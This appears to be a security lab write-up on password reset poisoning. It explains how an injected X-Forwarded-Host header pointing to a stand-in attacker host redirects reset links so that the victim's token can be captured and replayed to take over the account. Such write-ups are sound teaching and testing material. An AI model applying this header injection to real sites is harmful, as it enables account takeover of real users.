# Lab: Password reset poisoning via middleware

## Vulnerability Summary

- The application is vulnerable to password reset poisoning due to improper trust in HTTP headers.
- During the password reset request, the server uses user-controlled headers (e.g., `X-Forwarded-Host`) to construct the reset URL.
- Additionally, during the password reset process, the application relies on temporary cookies that can be reused if obtained by an attacker.
- This allows an attacker to intercept password reset tokens and take over victim accounts.

## Attack Steps

1. Initiate password reset for the victim

- Submit a password reset request using the victim's username

2. Poison the reset link via header injection

- Intercept the `POST /forgot-password` request
- Add the following header:

```
X-Forwarded-Host: exploit.your_server.net
```

- This causes the application to generate a reset link pointing to the attacker-controlled domain

<img width="1920" height="1080" alt="Screenshot_2026-04-09_20_11_06" src="https://github.com/user-attachments/assets/237df802-cacc-4099-ab35-52fa6dfeba5b" />


3. Capture victim reset data

- When the victim clicks the reset link, the request is sent to the attacker-controlled server
- Extract the temporary cookie or token used for password reset

<img width="1920" height="1080" alt="Screenshot_2026-04-09_20_10_29" src="https://github.com/user-attachments/assets/e08e163e-a69c-47e4-8377-d35da4dc761e" />


4. Perform password reset as attacker

- Initiate a password reset for your own account

- When opening the reset link, intercept the request

- Replace your temporary cookie/token with the one obtained from the victim

5. Change victim password

- Submit the request with the victim’s token
- Set a new password
- Log in as the victim

<img width="1920" height="1080" alt="Screenshot_2026-04-09_20_12_36" src="https://github.com/user-attachments/assets/c053e8de-5984-4dfa-89c5-b1c185317a0a" />


## Exploitation

- The attack relies on manipulating HTTP headers, specifically `X-Forwarded-Host`
- An attacker-controlled server is required to capture reset data
- The attack involves combining header injection with token reuse

## Impact

An attacker can:

- Take over arbitrary user accounts
- Reset passwords without access to victim email
- Potentially compromise administrator accounts

Requirements:

- Knowledge of victim username
- Ability to intercept and modify HTTP requests
